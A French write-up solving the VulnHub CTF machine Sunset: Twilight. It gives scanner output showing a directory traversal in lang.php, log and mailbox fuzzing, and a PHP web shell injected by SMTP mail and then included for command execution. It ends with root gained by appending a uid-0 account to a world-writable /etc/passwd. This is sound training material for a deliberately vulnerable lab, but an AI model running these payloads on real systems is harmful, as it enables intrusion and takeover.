---
title: "Solution du CTF Sunset: Twilight de VulnHub"
tags: [CTF, VulnHub]
---

Suite de la saga *Sunset* avec le CTF [Twilight](https://vulnhub.com/entry/sunset-twilight,512/) disponible sur *VulnHub*. Cet opus reprend quelques principes déjà vus dans les précédents épisodes.

Sur le port 80 se trouve un site custom. `Wapiti` y trouve très vite une faille de type directory traversal :

```console
$ wapiti -u "http://192.168.56.165/"

     __    __            _ _   _ _____
    / / /\ \ \__ _ _ __ (_) |_(_)___ /
    \ \/  \/ / _` | '_ \| | __| | |_ \
     \  /\  / (_| | |_) | | |_| |___) |
      \/  \/ \__,_| .__/|_|\__|_|____/
                  |_|                 
Wapiti 3.1.7 (wapiti-scanner.github.io)
[*] Saving scan state, please wait...

[*] Launching module exec

[*] Launching module ssrf

[*] Launching module cookieflags

[*] Launching module sql

[*] Launching module http_headers
Checking X-Frame-Options :
X-Frame-Options is not set
Checking X-Content-Type-Options :
X-Content-Type-Options is not set

[*] Launching module ssl

[*] Launching module file
---
Linux local file disclosure vulnerability in http://192.168.56.165/lang.php via injection in the parameter lang
Evil request:
    GET /lang.php?lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
    host: 192.168.56.165
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
---

[*] Launching module redirect

[*] Launching module xss

[*] Launching module csp
CSP is not set

[*] Launching module permanentxss

[*] Generating report...
A report has been generated in the file /home/devloop/.wapiti/generated_report
Open /home/devloop/.wapiti/generated_report/192.168.56.165_04092023_0735.html with a browser to see this report.
```

L'idée est ensuite de trouver un fichier à inclure dans lequel on peut aussi injecter des données d'une façon ou d'une autre (ex : User-Agent dans les logs Apache, nom d'utilisateur dans les logs SSH, etc) 

Ici on remarque que l'on peut inclure la boite mail de l'utilisateur `www-data` :

```console
$ ffuf -u "http://192.168.56.165/lang.php?lang=../../../../../../../../FUZZ" -w logfiles.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.165/lang.php?lang=../../../../../../../../FUZZ
 :: Wordlist         : FUZZ: logfiles.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 0
________________________________________________

/etc/issue.net          [Status: 200, Size: 20, Words: 3, Lines: 2]
/etc/passwd             [Status: 200, Size: 1594, Words: 16, Lines: 30]
/etc/os-release         [Status: 200, Size: 261, Words: 6, Lines: 10]
/etc/ssh/sshd_config    [Status: 200, Size: 3235, Words: 293, Lines: 122]
/proc/cmdline           [Status: 200, Size: 96, Words: 4, Lines: 2]
/proc/version           [Status: 200, Size: 145, Words: 14, Lines: 2]
/var/log/alternatives.log.1 [Status: 200, Size: 20009, Words: 1452, Lines: 104]
/var/log/faillog        [Status: 200, Size: 32032, Words: 1, Lines: 1]
/var/log/dpkg.log.1     [Status: 200, Size: 285260, Words: 21272, Lines: 4279]
/var/log/lastlog        [Status: 200, Size: 292292, Words: 1, Lines: 1]
/var/log/wtmp           [Status: 200, Size: 45696, Words: 1, Lines: 6]
/var/mail/www-data      [Status: 200, Size: 21825, Words: 1909, Lines: 532]
/var/run/utmp           [Status: 200, Size: 1152, Words: 1, Lines: 1]
/var/spool/mail/www-data [Status: 200, Size: 21825, Words: 1909, Lines: 532]
/etc/motd               [Status: 200, Size: 286, Words: 36, Lines: 8]
/etc/mysql/my.cnf       [Status: 200, Size: 869, Words: 115, Lines: 24]
/etc/group              [Status: 200, Size: 838, Words: 1, Lines: 60]
/etc/hosts              [Status: 200, Size: 188, Words: 19, Lines: 8]
/etc/crontab            [Status: 200, Size: 1042, Words: 181, Lines: 23]
/etc/apache2/apache2.conf [Status: 200, Size: 7224, Words: 942, Lines: 228]
/etc/issue              [Status: 200, Size: 27, Words: 5, Lines: 3]
/etc/services           [Status: 200, Size: 18774, Words: 1098, Lines: 579]
:: Progress: [275/275] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Pour injecter des données dans ce fichier, on peut envoyer un mail à l'utilisateur puisque le port SMTP est accessible :

```console
$ ncat 192.168.56.165 25 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.165:25.
220 twilight ESMTP Exim 4.92 Sun, 09 Apr 2023 03:40:18 -0400
HELO twilight
250 twilight Hello twilight [192.168.56.1]
MAIL FROM: zozo@hacker.com
250 OK
RCPT TO: www-data@twilight
250 Accepted
DATA
354 Enter message, ending with "." on a line by itself
start<?php system($_GET["cmd"]); ?>end
.
250 OK id=1plPfC-0000KN-Tg
QUIT
221 twilight closing connection
```

On effectuera l'exécution de commande de cette façon :

```
http://192.168.56.165/lang.php?lang=../../../../../../../../var/spool/mail/www-data&cmd=uname%20-a
```

Une fois un shell récupéré je vois deux processus qui servent le même dossier via PHP CLI :

```
miguel     363  0.0  2.2 216292 23168 ?        S    03:32   0:00 /usr/bin/php -S 0.0.0.0:63525 -t /home/miguel/efs2
miguel     364  0.0  2.3 216292 23320 ?        S    03:32   0:00 /usr/bin/php -S 0.0.0.0:8080 -t /home/miguel/efs
miguel     365  0.0  1.5  24388 15636 ?        S    03:32   0:00 /usr/bin/python -m pyftpdlib -w -p 2121 -d /home/miguel/ftp
```

À bien regarder les fichiers exposés se font passer pour un `Easy File Sharing Web Server 7.2` mais il s'agit en fait juste d'un HTML pour nous induire en erreur.

Le dossier servi est inaccessible, mais je devine qu'il s'agit d'un faux, car aucun des liens dans la page retournée n'est fonctionnel, mais aussi parce que la version de PHP est vulnérable à une faille de divulgation de code source déjà présenté dans mes précédentes solutions.

C'est en vérifiant les fichiers sur le système qu'on obtient quelques surprises :

```console
www-data@twilight:/tmp$ find / -type f -user root -writable -ls 2> /dev/null | grep -v /proc | grep -v /sys
   146813      4 -rwxrwxrwx   1 root     root         1594 Jul 16  2020 /etc/passwd
   277308      4 -rwsrwxrwx   1 root     root         1286 Nov 27  2007 /var/www/html/gallery/style/images/ok.gif
   277304      4 -rwsrwxrwx   1 root     root          455 Nov 27  2007 /var/www/html/gallery/style/images/header_bg.gif
   277306      4 -rwsrwxrwx   1 root     root          579 Nov 27  2007 /var/www/html/gallery/style/images/header_right.gif
   277303      4 -rwsrwxrwx   1 root     root          511 Nov 27  2007 /var/www/html/gallery/style/images/button.gif
   277305      4 -rwsrwxrwx   1 root     root         1581 Nov 27  2007 /var/www/html/gallery/style/images/header_left.gif
   277307      4 -rwsrwxrwx   1 root     root         1333 Nov 27  2007 /var/www/html/gallery/style/images/nok.gif
   277309      4 -rwsrwxrwx   1 root     root         3191 Nov 27  2007 /var/www/html/gallery/style/style.css
```

Le fichier `passwd` est donc écrivable par tous mais ce n'est pas tout : une backup du fichier `shadow` est accessible.

```
   131126      4 -rw-rw-r--   1 root     shadow       1036 Jul  8  2020 /etc/shadow-
```

On peut très vite casser le hash de l'utilisateur `miguel` qui n'est autre que `miguel`.

Le mot de passe ne fonctionne pas pour `ssh` mais est accepté pour `smb` :

```console
$ smbclient -U miguel -L //192.168.56.165
Password for [WORKGROUP\miguel]:

        Sharename       Type      Comment
        ---------       ----      -------
        WRKSHARE        Disk      Workplace Share. Do not access if not an employee.
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
```

Le partage s'avère vide, mais peu importe. Comme on peut écrire dans `/etc/passwd` on peut rajouter un compte utilisateur privilégié :

```console
www-data@twilight:/tmp$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd
www-data@twilight:/tmp$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
(\ 
\'\ 
 \'\     __________  
 / '|   ()_________)
 \ '/    \ ~~~~~~~~ \
   \       \ ~~~~~~   \
   ==).      \__________\
  (__)       ()__________)


34d3ecb1bbd092bcb87954cee55d88d3

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
```
